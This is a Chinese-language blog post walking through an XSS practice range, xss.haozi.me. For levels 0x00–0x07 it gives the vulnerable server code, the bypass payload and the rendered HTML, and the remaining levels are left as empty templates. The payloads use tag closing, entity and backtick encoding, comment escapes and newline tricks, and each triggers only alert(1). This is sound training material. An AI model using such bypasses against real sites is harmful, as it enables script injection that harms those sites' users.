---
layout: post
title: XSS 小游戏练习
categories: [XSS, Web安全, 渗透测试]
---

## 前言

今天在闲逛时发现一个针对 XSS 入门的小靶场，想想自己这一年来一直都在学习开发方面的知识，对安全的东西有些生疏了，正好可以当作复习了

靶场一共有 18 个题目，每道题分为 Server Code(服务端代码)、Input Code(可输入点)、Html(显示点)。分析 Server Code 在 Input Code 处输入构造的 Payload，最后结果会显示在 Html 处。都是 XSS 最基础的知识点，非常适合入门学习，因此记录一下

靶场地址：https://xss.haozi.me

**Tips：此靶场只适合了解 XSS，并不具备任何实战意义**

## 0x00

最基础的弹窗代码

Server Code
```js
function render (input) {
  return '<div>' + input + '</div>'
}
```

Input Code
```js
<script>alert(1)</script>
```

HTML
```html
<div><script>alert(1)</script></div>
```

## 0x01

标签闭合

Server Code
```js
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

Input Code
```html
</textarea><script>alert(1)</script>
```

HTML
```html
<textarea></textarea><script>alert(1)</script>
  </textarea>
```


## 0x02

引号和标签闭合

Server Code
```js
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

Input Code
```js
"><script>alert(1)</script>
```

HTML
```html
<input type="name" value=""><script>alert(1)</script>">
```

## 0x03

正则替换了小括号，用实体字符绕过或使用反引号绕过。

实体字符绕过是 HTML 的一个知识点：HTML 会将实体字符解析成对应的符号，因此在 HTML 的标签中可以通过实体字符来绕过 JS 中的过滤，但是 JS 代码中无法解析 HTML 编码，所以无法使用

反引号绕过是 JS 的一个知识点：JS 会将反引号中的内容作为可执行代码（很多脚本语言都有这个特性）

`<script>`标签

Server Code
```js
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

Input Code
```html
<!-- HTML标签使用实体字符绕过 -->
<img src="" onerror=alert&#40;&#49;&#41;>
<!-- 使用反引号绕过 -->
<img src="" onerror=alert`1`>
```

HTML
```html
<img src="" onerror=alert&#40;&#49;&#41;>
<img src="" onerror=alert`1`>
```

## 0x04

正则替换了小括号和反引号，使用 HTML 编码绕过

Server Code
```js
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

Input Code
```html
<img src="" onerror=alert&#40;&#49;&#41;>
```

HTML
```html
<img src="" onerror=alert&#40;&#49;&#41;>
```

## 0x05

使用`--!>`闭合掉注释标签，换行只是个人习惯

Server Code
```js
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```

Input Code
```html
--!>
<img src="" onerror=alert&#40;&#49;&#41;>

```

HTML
```html
<!-- --!>
  <img src="" onerror=alert&#40;&#49;&#41;>
 -->
```

## 0x06

利用正则不匹配换行符的特性，使用换行绕过

Server Code
```js
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

Input Code
```html
onclick
=alert(1)
```

HTML
```html
<input value=1 onclick
=alert(1) type="text">
```

## 0x07

利用 HTML 标签不闭合也能解析的容错机制，闭合掉前面的标签

Server Code
```js
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

Input Code
```js
< /article
<img src="" onerror=alert(1)
<!--
```

HTML
```html
<article>< /article
<img src="" onerror=alert(1)
<!--</article>
```

## 0x08



Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x09

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0A

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0B

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0C

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0D

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0E

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x0F

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x10

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x11

Server Code
```js

```

Input Code
```js

```

HTML
```html

```

## 0x12

Server Code
```js

```

Input Code
```js

```

HTML
```html

```
